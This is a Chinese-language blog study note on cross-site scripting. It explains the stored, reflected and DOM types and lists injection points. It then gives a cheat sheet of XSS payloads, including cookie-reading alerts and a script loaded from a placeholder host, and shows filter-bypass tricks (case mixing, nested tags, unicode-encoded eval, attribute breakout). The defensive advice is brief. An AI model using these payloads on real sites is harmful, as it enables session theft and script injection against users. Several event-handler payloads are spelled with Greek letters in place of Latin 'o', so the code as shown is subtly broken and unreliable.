---
title: 随记(23)—XSS攻击
date: 2021-03-30
author: LM
tags: ["随记"]
---

> 参考原文：[ XSS(跨站脚本攻击)详解  @615 ](https://www.cnblogs.com/wuqun/p/12484816.html)

## 1.简单介绍

HTML注入与XSS攻击简单来说就是当用户在输入框输入内容，后台对输入内容不做处理直接添加入页面。此时，**用户就可以刻意填写HTML、JavaScript脚本来作为文本输入**，这样这个页面就会出现一些用户加入的东西了，这是一种脚本注入。

```html
<a href=http://www.baidu.com>Click Me</a>
```

当然有些稍微有点脑子的网站会屏蔽 script 标签的输入，但是我们大可以利用类似于以下的语句注入脚本。

```html
<img src=1 οnerrοr=alert(1) />
<scr<script>ipt>
```

因此，相比起过滤script标签，建议采用更加高明的过滤'<''>''&'等符号。事实上html定义了几个特定符号专门用来表示这几个符号的，比如用&amp来代替&符号等。

## 2.XSS

跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！

XSS攻击主要分为以下三种

- 存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie
- 反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息
- DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。可能触发DOM型XSS的属性有：document.referer，window.name，location，innerHTML，documen.write。具体操作是在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法进行赋值或其他操作

## 3.XSS的攻击载荷

以下所有标签的 > 都可以用 // 代替

### script标签

```html
<script>alert("hack")</script>   #弹出hack
<script>alert(/hack/)</script>   #弹出hack
<script>alert(1)</script>        #弹出1，对于数字可以不用引号
<script>alert(document.cookie)</script>      #弹出cookie
<script src=http://xxx.com/xss.js></script>  #引用外部的xss
```

### svg标签

```html
<svg onload="alert(1)">
<svg onload="alert(1)"//
```

### img标签

```html
<img  src=1  οnerrοr=alert("hack")>
<img  src=1  οnerrοr=alert(document.cookie)>  #弹出cookie
```

### body标签

```html
<body οnlοad=alert(1)>
<body οnpageshοw=alert(1)>
```

### video标签

```html
<video οnlοadstart=alert(1) src="/media/hack-the-planet.mp4" />
```

### style标签

```html
<style οnlοad=alert(1)></style>
```

## 4.XSS可以插在哪里？

- 用户输入作为script标签内容
- 用户输入作为HTML注释内容
- 用户输入作为HTML标签的属性名
- 用户输入作为HTML标签的属性值
- 用户输入作为HTML标签的名字
- 直接插入到CSS里
- 最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！

```html
<!-- 用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过-->
<!-- --><script>alert('hack')</script><!-- -->
<!-- 用户输入作为标签属性名，导致攻击者可以进行闭合绕过-->
<div 用户输入="xx">  </div>
<div ></div><script>alert('hack')</script><div a="xx"> </div>
<!-- 用户输入作为标签属性值，导致攻击者可以进行闭合绕过-->
<div id="用户输入"></div>
<div id=""></div><script>alert('hack')</script><div a="x"></div>
<!-- 用户输入作为标签名，导致攻击者可以进行闭合绕过-->
<用户输入  id="xx" />
<><script>alert('hack')</script><b id="xx" />
<!-- 用户输入作为CSS内容，导致攻击者可以进行闭合绕过-->
<style>用户输入<style>
<style> </style><script>alert('hack')</script><style> </style>
```

## 5.XSS漏洞的挖掘 

尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：

- URL的每一个参数
- URL本身
- 表单
- 搜索框

常见业务场景

- 重灾区：评论区、留言区、个人信息、订单信息等
- 针对型：站内信、网页即时通讯、私信、意见反馈
- 存在风险：搜索框、当前目录、图片属性等

## 6.XSS的简单过滤和绕过

### a.区分大小写过滤标签

```html
<!-- 可以使用大小写绕过-->
<scripT>alert('hack')</scripT>
<sCript>alert("hey!")</scRipt>
```

### b.不区分大小写过滤标签

```html
<!-- 可以使用嵌套的script标签绕过 --> 
<scr<script>ipt>alert('hack')</scr</script>ipt>
```

### c.不区分大小写，过滤之间的所有内容

```html
<!-- 虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。onerror事件是专门针对js出错的，标签闭合性被破坏会触发这个事件。--> 
 <img src=1 οnerrοr=alert('hack')>
```

### d.编码脚本代码绕过关键字过滤

```html
<!-- 有的时候，服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval（）来实现。eval()会将编码过的语句解码后再执行，简直太贴心了。例如alert(1)编码过后就是 \u0061\u006c\u0065\u0072\u0074(1)--> 
<script>eval(\u0061\u006c\u0065\u0072\u0074(1))</script>
```

### e.主动闭合标签实现注入代码

```html
<!-- 有些注入点出现在链接或属性中，此时可以使用"主动的闭合标签，实现代码的注入-->
";alert("I am coming again~");"
```

